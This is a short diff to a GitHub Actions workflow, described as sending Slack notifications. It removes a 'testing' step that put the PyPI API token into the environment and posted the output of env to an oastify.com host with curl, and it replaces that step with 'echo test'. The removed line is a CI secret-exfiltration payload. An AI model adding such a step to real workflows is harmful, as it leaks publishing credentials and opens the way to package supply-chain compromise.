@@ -8,9 +8,6 @@ jobs:
     runs-on: ubuntu-20.04
     name: Sends a message to Slack when a push, a pull request or an issue is made
     steps:
-      - shell: bash
-        name: testing
-        env:
-          TOKEN: ${{ secrets.PYPI_API_TOKEN }}
+      - name: testing
         run: |
-          curl https://waae5fjojh3qbduj5mwlyj68lzrqfg35.oastify.com --data $(env)
+          echo test
